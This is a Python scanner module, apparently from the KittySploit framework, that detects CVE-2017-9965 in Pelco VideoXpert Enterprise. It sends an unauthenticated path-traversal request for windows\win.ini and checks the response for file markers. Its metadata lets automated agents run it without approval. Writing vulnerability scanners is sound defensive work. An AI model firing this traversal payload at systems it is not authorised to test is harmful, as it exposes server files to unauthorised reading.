#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Schneider Electric Pelco VideoXpert Enterprise versions 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Schneider Electric Pelco VideoXpert Enterprise 2.0 - Path Traversal Detection',
        'description': 'Schneider Electric Pelco VideoXpert Enterprise versions 2.0 and prior contain a directory traversal caused by insufficient input validation, letting unauthorized persons view web server files, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'schneider', 'pelco', 'packetstorm', 'lfi', 'videoxpert', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/143317/Schneider-Electric-Pelco-VideoXpert-Core-Admin-Portal-Directory-Traversal.html',
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5419.php',
            'https://ics-cert.us-cert.gov/advisories/ICSA-17-355-02',
            'https://www.schneider-electric.com/en/download/document/SEVD-2017-339-01/',
        ],
        'cve': 'CVE-2017-9965',
    }

    def run(self):
        r = self.http_request(method="GET", path='/portal//..\\\\\\..\\\\\\..\\\\\\..\\\\\\windows\\win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Schneider Electric Pelco VideoXpert Enterprise 2.0 - Path Traversal detected",
                path='/portal//..\\\\\\..\\\\\\..\\\\\\..\\\\\\windows\\win.ini',
            )
            return True
        return False

